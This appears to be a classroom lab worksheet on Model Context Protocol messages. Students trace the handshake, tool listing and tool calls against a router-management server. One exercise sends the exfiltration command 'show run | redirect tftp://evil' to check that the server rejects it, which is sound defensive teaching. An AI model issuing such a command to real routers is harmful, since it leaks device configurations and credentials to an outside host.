# Lab 1 Worksheet — Protocol on the Wire

**25 minutes · client: MCP Inspector · prerequisite: pre-flight all green**

You will trigger every message type MCP has — request, response, notification — and label them yourself. After this lab, nothing about MCP is magic: it's JSON you have read with your own eyes.

Keep three panes visible: Inspector in the browser, the **server terminal** on `linuxdesktop4`, and this worksheet.

---

## A. The handshake (8 min)

Disconnect and reconnect Inspector (connect pane → Disconnect → Connect) so you see the session from the beginning. Open Inspector's **History** pane.

The first exchange is `initialize`. Find it and answer from the actual JSON:

**A1.** The client's request includes `"protocolVersion"`, `"capabilities"` and `"clientInfo"`. What did Inspector declare in its `capabilities`?

**A2.** The server's response declares its own capabilities. Fill in from what you see:

| Capability | Declared value |
|---|---|
| `tools.listChanged` |  |
| `resources.subscribe` |  |
| `prompts` |  |

**A3.** The response also carries `"instructions"` — the text the server author wants injected into every AI conversation. Write down its first sentence. (Where did you meet this text before? Hint: LibreChat's `serverInstructions: true`.)

**A4.** Immediately after the response, the client sends `notifications/initialized`. Look at the JSON: what field is *missing* compared to the `initialize` request, and what does its absence mean?

> Answer to check yourself: no `"id"` — it's a **notification**: one-way, no response expected. Requests have `id`; responses match it; notifications never carry one. This is the entire JSON-RPC message taxonomy.

## B. Discovery (5 min)

Open the **Tools** tab (this fires `tools/list`).

**B1.** How many tools? Which two carry `destructiveHint: true` in their annotations?

**B2.** Pick `configure_interface` and look at its `inputSchema`. Where did this JSON Schema come from? (Nobody wrote it by hand — see Server Code Walkthrough §5: it's generated from the Python function signature.)

**B3.** In the History pane, confirm: was `tools/list` a request or a notification? How do you know?

## C. Execution (7 min)

Call `get_interfaces` from the Tools tab. Watch **both** panes: Inspector's history and the server terminal.

**C1.** Order the events as you observed them (number 1–5):

- [ ] server terminal shows the SSH session to 172.18.2.6
- [ ] `tools/call` request appears (with an `id`)
- [ ] progress notifications arrive ("Connecting to Router1 over SSH...")
- [ ] result arrives carrying the same `id` as the request
- [ ] router's interface table visible in the result's `content`

**C2.** The progress messages are notifications, not responses. Why does that matter for a slow SSH call in a client like LibreChat? (Hint: timeouts.)

**C3.** Now call `dynamic_show` with the command `show run | redirect tftp://evil`. Read the result. Is this an error at the protocol level (a JSON-RPC error) or a *successful* tool result whose text describes a rejection? Why did the server author choose that? (Walkthrough §4, "the error rule.")

## D. Wrap (5 min)

**D1.** Complete the table for the three messages you highlighted today:

| Message | Kind (request/response/notification) | Who initiated |
|---|---|---|
| `initialize` |  |  |
| `notifications/initialized` |  |  |
| `tools/call` → result |  |  |

**D2.** In one sentence: what does the server know about the *client's* abilities, and when did it learn it?

**Done when:** C1 ordered correctly, D1 filled, and you can point at the `initialize` exchange in the History pane on request.

---

## If you finish early

- Call `get_router_info` and compare its result to `get_interfaces` — find the `structuredContent` and the `outputSchema` on the tool definition.
- Predict, then verify: what happens to `tools/list` after you call `enable_config_tools` with `enabled: false`? (You'll formally do this in Lab 5 — spoilers allowed.)
